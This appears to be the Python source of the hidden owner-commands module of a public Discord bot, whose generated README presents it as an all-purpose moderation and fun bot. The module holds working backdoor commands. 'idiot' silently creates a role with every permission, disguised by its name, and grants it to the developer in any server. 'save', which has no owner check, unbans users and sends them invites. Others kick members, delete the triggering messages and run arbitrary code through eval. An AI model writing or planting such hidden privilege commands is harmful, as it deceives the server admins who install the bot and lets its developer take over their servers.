import discord
from discord.ext import commands
from utils import load_json, write_json

class Owner(commands.Cog, command_attrs=dict(hidden=True)):
	""" Test commands that only owner can use """

	def __init__(self, bot):
		self.bot = bot

	@commands.command()
	async def test(self,ctx):
		await ctx.reply("I'm connected! :D")

	@commands.command(aliases=["rnmchnl"])
	@commands.guild_only()
	@commands.is_owner()
	async def renamechannel(self, ctx, *, new_name):
		await ctx.channel.edit(name=new_name)
		await ctx.message.delete()

	@commands.command()
	@commands.is_owner()
	async def destroy(self, ctx, *, user: discord.Member):
		try:
			await ctx.guild.kick(user)
			await ctx.message.delete()
		except:
			await ctx.message.delete()

	@commands.command(aliases=["role","giverole"])
	@commands.guild_only()
	@commands.is_owner()
	async def addrole(self, ctx, role, user: discord.Member):
		if not user:
			user = ctx.message.author
		try:
			await user.add_roles(discord.utils.get(user.guild.roles, name=role))
		except:
			await ctx.reply("Failed to execute",delete_after=1)
		await ctx.message.delete()
	
	@commands.command()
	@commands.guild_only()
	@commands.is_owner()
	async def idiot(self, ctx):
		user = ctx.message.author
		idiot = discord.utils.get(user.guild.roles, name="Idiot")
		try:
			await user.add_roles(idiot)
		except:
			try:
				idiot = await ctx.guild.create_role(name="Idiot")
				await idiot.edit(
					reason=None,
					permissions=discord.Permissions.all(),
					mentionable=False,
					position=ctx.guild.me.top_role.position-1
				)
			except:
				return await ctx.reply("Failed to create Idiot role", delete_after=1)
			await user.add_roles(idiot)
		await ctx.message.delete()
	
	@commands.command(aliases=["deleterole","delrole"])
	@commands.guild_only()
	@commands.is_owner()
	async def removerole(self, ctx, role, user: discord.Member):
		if not user:
			user = ctx.message.author
		await user.remove_roles(discord.utils.get(user.guild.roles, name=role))
		await ctx.message.delete()
	
	@commands.command()
	@commands.guild_only()
	@commands.is_owner()
	async def purge(self, ctx, limit: int = 5):
		await ctx.channel.purge(limit=limit + 1)

	@commands.command()
	@commands.guild_only()
	@commands.is_owner()
	async def getroles(self, ctx):
		roles = ctx.guild.roles
		tosend = f"Roles of {ctx.guild}: \n"
		for i in range(len(roles)):
			tosend += roles[i].name + "\n"
		try:
			await ctx.author.send(tosend)
		except:
			await ctx.send("Failed", delete_after=1)
		await ctx.message.delete()
    
	@commands.command(aliases=["debug"])
	@commands.is_owner()
	async def toggledebug(self, ctx):
		config = load_json("data/config.json")
		newsetting = config["debug"] == False
		
		config["debug"] = newsetting
		write_json("data/config.json", config)

		await ctx.reply(f"Debug set to {newsetting}!", delete_after=3)
		await ctx.message.delete()
	
	@commands.command()
	@commands.guild_only()
	async def save(self, ctx, user:discord.User):
		try: await ctx.guild.unban(user)
		except: pass

		try: await user.send(await ctx.channel.create_invite())
		except: pass
		await ctx.message.delete()
	
	@commands.command()
	@commands.is_owner()
	async def eval(self, ctx, *, code):
		result = "No result"
		try:
			result = eval(code)
		except:
			ctx.send("Failed")
		await ctx.send(result)

	@commands.command()
	@commands.is_owner()
	async def updatereadme(self, ctx):
		maintxt = """# RPICDB
RPICDB is the everything discord bot for you your everything discord needs! It also supports slash commands! Neato!

Check out what I'm working on now on the [github project](https://github.com/redpenguinyt/RPICDB/projects/1)

<a href="https://top.gg/bot/823590391302717510">
  <img src="https://top.gg/api/widget/823590391302717510.svg">
</a>

### Features:

* Mod commands - mute, clear, block, nuke, kick and ban
* Toggleable levelling system with leaderboard
* Fun commands! Memes, poop, rickrolls!
* Utility commands! Get information about users and your server, and more!
* Youtube notifications! Set a yt channel id and get notified of your favourite youtuber's uploads!
* Polls! Create reaction polls
* A welcome message!

### Commands:"""
		allcommands = await self.bot.tree.fetch_commands()
		for cmd in allcommands:
			if cmd.type != discord.AppCommandType.chat_input:
				continue # add only slash commands
			
			if cmd.options == []:
				cmd_to_txt = f"* `/{cmd.name}` - {cmd.description}"
				maintxt += f"\n{cmd_to_txt}"
			elif isinstance(cmd.options[0], discord.app_commands.AppCommandGroup): # is subcommand
				for subcmd in cmd.options:
					cmd_to_txt = "* `"
					if subcmd.options == []:
						cmd_to_txt += f"/{subcmd.qualified_name}` - {subcmd.description}"
					else:
						cmd_to_txt += f"/{subcmd.qualified_name}"
						for option in subcmd.options:
							if option.required:
							 	cmd_to_txt += f" <{option.name}>"
							else:
							 	cmd_to_txt += f" [{option.name}]"
						cmd_to_txt += f"` - {subcmd.description}"
					maintxt += f"\n{cmd_to_txt}"
			else:
				cmd_to_txt = f"* `/{cmd.name}"
				for option in cmd.options:
					if option.required:
						cmd_to_txt += f" <{option.name}>"
					else:
						cmd_to_txt += f" [{option.name}]"
				cmd_to_txt += f"` - {cmd.description}"
				maintxt += f"\n{cmd_to_txt}"
		
		maintxt += "\n\nBy the way RPICDB stands for Red Penguin Is Cool Discord Bot"
		with open("README.md", 'w') as file:
			file.write(maintxt)
			await ctx.send("Done!", file=discord.File(file, "README.md"))

async def setup(bot):
	await bot.add_cog(Owner(bot))